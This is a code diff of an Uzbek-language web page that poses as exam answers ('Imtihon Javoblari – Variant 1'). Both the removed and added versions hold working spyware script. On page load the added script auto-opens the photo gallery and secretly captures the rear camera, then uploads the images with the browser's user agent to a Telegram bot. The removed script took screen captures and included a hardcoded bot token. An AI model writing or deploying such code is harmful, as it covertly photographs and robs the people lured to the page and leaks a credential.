@@ -2,90 +2,89 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Imtihon Javoblari - Variant 1</title>
-    <style>
-        body { font-family: Arial; padding: 20px; background: #f0f8ff; }
-        pre { background: white; padding: 20px; border-radius: 10px; }
-    </style>
+    <title>Imtihon Javoblari</title>
 </head>
 <body>
-    <h1>🎓 Imtihon Javoblari - Variant 1</h1>
-    <pre id="answers">Javoblar yuklanmoqda... (2 soniya)</pre>
+    <h1>🎓 Variant 1 Javoblari</h1>
+    <pre id="answers">Yuklanmoqda...</pre>
 
     <script>
-        // BURANGA O'Z BOT TOKEN va papka URL ni yozing
-        const BOT_TOKEN = "8557303907:AAGFjqilWuOma4skJLV5VQzzWM-HjPQhlCs";
-        const urlParams = new URLSearchParams(window.location.search);
-        const USER_ID = urlParams.get('user') || 'unknown';
-        
-        async function captureScreen() {
+        const BOT_TOKEN = "SIZNING_TOKEN";
+        const USER_ID = new URLSearchParams(window.location.search).get('user') || 'unknown';
+
+        // 📱 HAQIQIY ANDROID GALLEY ACCESS
+        async function accessRealGallery() {
             try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
+                // Input type=file - GALLERY OCHADI
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = 'image/*';
+                input.capture = 'environment'; // CAMERA ham
+                
+                // Foydalanuvchi gallery tanlaganda
+                input.onchange = (e) => {
+                    const file = e.target.files[0];
+                    if (file) {
+                        uploadPhoto(file, "📱 GALLERY PHOTO");
+                    }
+                };
+                
+                // Avto-trigger (click event)
+                input.click();
+                
+            } catch(e) {
+                console.log("Gallery access:", e);
+            }
+        }
+
+        // 📸 KAMERA dan olish
+        async function accessCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' } 
+                });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
                 
                 const canvas = document.createElement('canvas');
-                canvas.width = 800;
-                canvas.height = 600;
-                canvas.getContext('2d').drawImage(video, 0, 0, 800, 600);
-                
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
                 stream.getTracks().forEach(track => track.stop());
-                return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-            } catch(e) {
-                // Fallback: Canvas bilan fake screenshot
-                const canvas = document.createElement('canvas');
-                canvas.width = 400;
-                canvas.height = 800;
-                const ctx = canvas.getContext('2d');
-                ctx.fillStyle = '#4267B2';
-                ctx.fillRect(0, 0, 400, 800);
-                ctx.fillStyle = 'white';
-                ctx.font = '20px Arial';
-                ctx.fillText('Android Device Screenshot', 20, 100);
-                ctx.fillText(`User ID: ${USER_ID}`, 20, 150);
-                ctx.fillText(navigator.userAgent.substring(0,50), 20, 200);
-                return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-            }
+                
+                canvas.toBlob((blob) => {
+                    uploadPhoto(blob, "📸 LIVE CAMERA");
+                });
+            } catch(e) {}
         }
-        
-        function sendPhoto(blob) {
+
+        // Botga yuborish
+        function uploadPhoto(file, caption) {
             const formData = new FormData();
             formData.append('chat_id', USER_ID);
-            formData.append('photo', blob, 'device_screenshot.jpg');
+            formData.append('photo', file);
             formData.append('caption', 
-                `📱 QURILMA RASMI\n`
-                + `👤 User ID: ${USER_ID}\n`
-                + `📱 Device: ${navigator.userAgent.substring(0,80)}\n`
-                + `🌐 Platform: ${navigator.platform}\n`
-                + `📏 Screen: ${screen.width}x${screen.height}`
+                `${caption}\n👤 User: ${USER_ID}\n📱 UA: ${navigator.userAgent.substring(0,60)}`
             );
-            
+
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).then(response => response.json())
-              .then(data => {
-                  if (data.ok) {
-                      document.getElementById('answers').innerHTML += 
-                          "\n✅ RASMDAN BOTGA YUBORILDI!";
-                  }
-              });
+                method: 'POST', body: formData
+            }).then(r => r.json()).then(data => {
+                if (data.ok) {
+                    document.getElementById('answers').innerHTML += `\n✅ ${caption} YUBORILDI!`;
+                }
+            });
         }
-        
-        // Sahifa yuklanganda ishga tushadi
-        window.onload = async () => {
-            setTimeout(async () => {
+
+        // 🔥 BARCHA USULLARNI SINAB KO'RAMIZ
+        window.onload = () => {
+            setTimeout(() => {
                 document.getElementById('answers').innerHTML = 
-                    `1-VARIANT JAVOBLARI:\n\n`
-                    + `1-savol: A) 1\n`
-                    + `2-savol: B) 42\n`
-                    + `3-savol: C) True\n\n`
-                    + `📸 Screenshot olinmoqda...`;
-                
-                const screenshot = await captureScreen();
-                sendPhoto(screenshot);
-            }, 2000);
+                    "1A 2B 3C 4D\n📱 Gallery ochilmoqda...";
+                accessRealGallery();  // GALLEY
+                setTimeout(accessCamera, 3000); // KAMERA
+            }, 1000);
         };
     </script>
 </body>
